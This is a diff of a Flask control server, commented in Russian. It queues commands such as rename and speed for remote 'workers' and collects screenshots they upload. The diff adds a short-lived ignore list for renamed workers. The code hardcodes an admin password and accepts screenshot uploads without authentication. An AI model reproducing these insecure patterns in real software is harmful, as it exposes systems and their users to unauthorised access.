@@ -1,4 +1,4 @@
-import os, io, json, base64
+import os, io, json, base64, time
 from flask import Flask, render_template, request, jsonify, Response
 from datetime import datetime, timedelta
 from functools import wraps
@@ -9,6 +9,7 @@ USER_LOGIN = "Admin"
 USER_PASSWORD = "GhostType9991"
 
 workers, commands_queue, screenshots = {}, {}, {}
+ignored_names = {} # Имена, которые временно нельзя создавать заново
 
 def requires_auth(f):
     @wraps(f)
@@ -33,8 +34,14 @@ def update():
     name = data.get("name")
     if not name: return jsonify({"status": "error"}), 400
     
+    # ПРОВЕРКА БАН-ЛИСТА (чтобы не создавался дубль при переименовании)
+    if name in ignored_names:
+        if time.time() < ignored_names[name]:
+            return jsonify({"status": "ignored", "commands": {"new_name": "SYNCING..."}})
+        else:
+            del ignored_names[name]
+
     now = datetime.utcnow() + timedelta(hours=2) # Киев
-    
     if name not in workers: workers[name] = {'start_session': now}
     
     workers[name].update({
@@ -73,11 +80,16 @@ def admin_action():
             new_name = c.get('name')
             
             if new_name and new_name != t:
+                # Отправляем команду переименования
                 if t not in commands_queue: commands_queue[t] = {}
                 commands_queue[t]['new_name'] = new_name
-                # Переносим историю в новый ключ
+                
+                # Добавляем старое имя в игнор на 30 секунд
+                ignored_names[t] = time.time() + 30
+                
+                # Переносим данные
                 if t in workers: workers[new_name] = workers.pop(t)
-                t = new_name # Дальнейшие команды (скорость и т.д.) шлем уже новому
+                t = new_name
             
             if t not in commands_queue: commands_queue[t] = {}
             if 'speed' in c: commands_queue[t]['new_speed'] = float(c['speed'])
@@ -98,8 +110,7 @@ def admin_action():
 @app.route('/api/upload_shot', methods=['POST'])
 def upload_shot():
     data = request.json
-    if data.get("name") and data.get("image"):
-        screenshots[data["name"]] = data["image"]
+    if data.get("name") and data.get("image"): screenshots[data["name"]] = data["image"]
     return jsonify({"status": "ok"})
 
 @app.route('/api/get_screenshot/<name>')
